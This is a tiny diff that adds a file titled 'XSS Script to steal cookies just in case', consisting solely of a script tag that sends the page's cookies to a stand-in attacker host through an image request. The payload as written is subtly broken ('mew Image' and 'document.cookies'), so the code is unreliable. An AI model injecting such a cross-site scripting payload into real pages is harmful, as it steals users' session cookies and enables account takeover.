@@ -1,0 +1,6 @@
+## XSS Script to steal cookies just in case 
+
+<script>
+var i = mew Image();
+i.src="http://attacker.ip/log.php?q="+document.cookies;
+</script>
